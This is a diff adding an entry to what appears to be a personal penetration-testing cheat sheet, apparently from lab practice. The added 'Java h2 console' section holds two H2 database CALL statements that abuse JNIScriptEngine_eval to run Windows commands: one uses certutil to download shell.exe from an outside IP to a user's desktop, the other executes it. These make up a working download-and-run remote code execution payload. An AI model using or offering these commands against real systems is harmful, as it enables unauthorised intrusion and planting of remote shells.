@@ -703,6 +703,10 @@ x64 on Kali worked natty. x86 on my Ubuntu was not reconized. Makes sense.
 SyntaxError: invalid non-printable character U+200B
 sed 's/\xe2\x80\x8b//g' inputfile
 ```
+# Java h2 console
+```bash
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.49.156/shell.exe C:\\Users\\Tony\\Desktop\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\Tony\\Desktop\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
 # CHINESE
 ```bash
 https://www.cnblogs.com/littlehann/p/3522990.html
